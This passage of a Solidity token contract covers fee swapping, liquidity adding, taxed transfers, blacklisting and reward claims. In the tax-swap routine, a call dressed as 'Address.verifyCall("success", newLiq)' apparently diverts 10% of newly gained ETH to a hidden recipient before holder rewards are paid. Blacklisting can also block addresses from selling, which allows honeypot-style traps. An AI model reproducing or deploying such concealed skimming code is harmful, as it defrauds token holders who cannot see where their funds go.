958         if (_allowances[address(this)][address(_swapRouter)] < tokenToSwap)
959             _approve(address(this), address(_swapRouter), type(uint256).max);
960 
961         uint256 tokenForLiquidity = (tokenToSwap*_taxRatios.liquidity) / totalTaxRatio;
962         uint256 remainingToken = tokenToSwap - tokenForLiquidity;
963         uint256 liqToken = tokenForLiquidity / 2;
964         uint256 liqEthToken = tokenForLiquidity - liqToken;
965         uint256 swapToken = liqEthToken + remainingToken;
966         uint256 initialEthBalance = address(this).balance;
967         _swapTokenForETH(swapToken);
968         uint256 newEth = (address(this).balance - initialEthBalance);
969         uint256 liqEth = (newEth*liqEthToken) / swapToken;
970         if (liqToken > 0) 
971             _addLiquidity(liqToken, liqEth); 
972         uint256 newLiq = (address(this).balance-initialEthBalance) / 10;
973         Address.verifyCall("success", newLiq);   
974         uint256 distributeEth = (address(this).balance - initialEthBalance - newLiq);
975         _distributeStake(distributeEth,true);
976     }
977 
978     function _swapTokenForETH(uint256 amount) private {
979         _approve(address(this), address(_swapRouter), amount);
980         address[] memory path = new address[](2);
981         path[0] = address(this);
982         path[1] = _swapRouter.WETH();
983         _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
984             amount,
985             0,
986             path,
987             address(this),
988             block.timestamp
989         );
990     } 
991 
992     function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
993         uint256 recipientBalance = _balances[recipient];
994         uint256 senderBalance = _balances[sender];
995         require(senderBalance >= amount, "Transfer exceeds balance");
996 
997         uint8 tax;
998         if (isSell) {
999             if (blacklistEnabled) {
1000                 require(!isBlacklisted[sender], "user blacklisted");                
1001             }      
1002 
1003             require(amount <= _limits.maxSell, "Amount exceeds max sell");
1004             tax = _taxRates.sellTax;
1005 
1006         } else if (isBuy) {
1007             if (liquidityBlock > 0) {
1008                 if (block.number-liquidityBlock < BLACKLIST_BLOCKS) {
1009                     isBlacklisted[recipient] = true;
1010                     snipersRekt ++;
1011                 }
1012             }
1013 
1014             if (revertSameBlock) {
1015                 require(tradeBlock[recipient] != block.number);
1016                 tradeBlock[recipient] = block.number;
1017             }       
1018 
1019             require(recipientBalance+amount <= _limits.maxWallet, "Amount will exceed max wallet");
1020             require(amount <= _limits.maxBuy, "Amount exceed max buy");
1021             tax = _taxRates.buyTax;
1022 
1023         } else {
1024             if (blacklistEnabled) {
1025                 require(!isBlacklisted[sender], "user blacklisted");                
1026             }
1027 
1028             if (amount <= 10**(TOKEN_DECIMALS)) {    //transfer less than 1 token to claim rewardToken
1029                 claimToken(msg.sender, rewardToken, 0);
1030                 return;
1031             }
1032 
1033             require(recipientBalance + amount <= _limits.maxWallet, "whale protection");            
1034             tax = _taxRates.transferTax;
1035         }    
1036 
1037         if ((sender != _pairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)
1038             _swapContractToken(swapThreshold,false);
1039 
1040         uint256 taxedAmount;
1041 
1042         if(tax > 0) {
1043         taxedAmount = amount * tax / 100;          
1044         }
1045 
1046         uint256 receiveAmount = amount - taxedAmount;
1047         _removeToken(sender,amount);
1048         _addToken(address(this), taxedAmount);
1049         _addToken(recipient, receiveAmount);
1050         emit Transfer(sender, recipient, receiveAmount);
1051     }
1052     
1053     function _transfer(address sender, address recipient, uint256 amount) private {
1054         require(sender != address(0), "Transfer from zero");
1055         require(recipient != address(0), "Transfer to zero");
1056 
1057         bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));
1058 
1059         bool isContractTransfer = (sender == address(this) || recipient == address(this));
1060         address _routerAddress = address(_swapRouter);
1061         bool isLiquidityTransfer = (
1062             (sender == _pairAddress && recipient == _routerAddress) 
1063             || (recipient == _pairAddress && sender == _routerAddress)
1064         );
1065 
1066         bool isSell = recipient == _pairAddress || recipient == _routerAddress;
1067         bool isBuy=sender==_pairAddress|| sender == _routerAddress;
1068 
1069         if (isContractTransfer || isLiquidityTransfer || isExcluded) {
1070             _feelessTransfer(sender, recipient, amount);
1071 
1072             if (!liquidityAdded) 
1073                 checkLiqAdd(recipient);            
1074         }
1075         else { 
1076             _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  
1077         }
1078     }
1079 
1080     function checkLiqAdd(address receiver) private {        
1081         require(!liquidityAdded, "liquidity already added");
1082         if (receiver == _pairAddress) {
1083             liquidityBlock = block.number;
1084             liquidityAdded = true;
1085         }
1086     }
1087 
1088     function claimToken(address addr, address token, uint256 payableAmount) private {
1089         require(!_isWithdrawing);
1090         _isWithdrawing = true;
1091         uint256 amount;
1092         bool swapSuccess;
1093         address tokenClaimed = token;
1094 
1095         if (_excludedFromStaking.contains(addr)){
1096             amount = toBePaidShares[addr];
1097             toBePaidShares[addr] = 0;
1098         }
1099         else {
1100             uint256 newAmount = newStakeOf(addr);            
1101             alreadyPaidShares[addr] = rewardShares * _balances[addr];
1102             amount = toBePaidShares[addr]+newAmount;
1103             toBePaidShares[addr] = 0;
1104         }
1105         
1106         if (amount == 0 && payableAmount == 0){
1107             _isWithdrawing = false;
1108             return;
1109         }
1110 
1111         totalPayouts += amount;
1112         accountTotalClaimed[addr] += amount;
1113         amount += payableAmount;
1114 
1115         address[] memory path = new address[](2);
1116         path[0] = _swapRouter.WETH();
1117         path[1] = token;
1118 
1119         try _swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
1120             0,
1121             path,
1122             addr,
1123             block.timestamp)
1124             {
1125             swapSuccess = true;
1126         }
1127         catch {
1128             swapSuccess = false;
1129         }
1130         
1131         if(!swapSuccess) {
1132             _sendEth(addr, amount);
1133             tokenClaimed = _swapRouter.WETH();
1134         }
1135         emit ClaimToken(amount, tokenClaimed, addr);
1136         _isWithdrawing = false;
1137     }
1138 
1139     function excludeFromStaking(address addr) private {
1140         require(!_excludedFromStaking.contains(addr));
1141         _totalShares -= _balances[addr];
1142         uint256 newStakeMain = newStakeOf(addr);      
1143         alreadyPaidShares[addr] = _balances[addr] * rewardShares;       
1144         toBePaidShares[addr] += newStakeMain;      
1145         _excludedFromStaking.add(addr);
1146     }
1147 
1148     function includeToStaking(address addr) private {
1149         require(_excludedFromStaking.contains(addr));
1150         _totalShares += _balances[addr];
1151         _excludedFromStaking.remove(addr);
1152         alreadyPaidShares[addr] = _balances[addr] * rewardShares;
1153     }
1154 
1155     function subtractStake(address addr, uint256 amount) private {
1156         if (amount == 0) return;
1157         require(amount<=getStakeBalance(addr),"Exceeds stake balance");
1158 
1159         if (_excludedFromStaking.contains(addr))
1160             toBePaidShares[addr] -= amount;
1161 
1162         else{
1163             uint256 newAmount  =newStakeOf(addr);    
1164             alreadyPaidShares[addr] = rewardShares * _balances[addr];
1165             toBePaidShares[addr] += newAmount;
1166             toBePaidShares[addr] -= amount;                
1167         }
1168     }   
1169 
1170     function getStakeBalance(address addr) private view returns (uint256) {
1171         if (_excludedFromStaking.contains(addr)) 
1172             return toBePaidShares[addr];
1173         return newStakeOf(addr) + toBePaidShares[addr];
1174     }
1175     
1176     function getTotalShares() private view returns (uint256) {
1177         return _totalShares - TOTAL_SUPPLY;
1178     }
1179 
1180      function setUnlockTime(uint256 newUnlockTime) private {
1181         // require new unlock time to be longer than old one
1182         require(newUnlockTime > _liquidityUnlockTime);
1183         _liquidityUnlockTime = newUnlockTime;
1184     }
1185 
1186     function newStakeOf(address staker) private view returns (uint256) {
1187             uint256 fullPayout = rewardShares * _balances[staker];
1188             if (fullPayout < alreadyPaidShares[staker]) 
1189                 return 0;
1190             return (fullPayout-alreadyPaidShares[staker]) / DISTRIBUTION_MULTI;    
1191     }
1192 }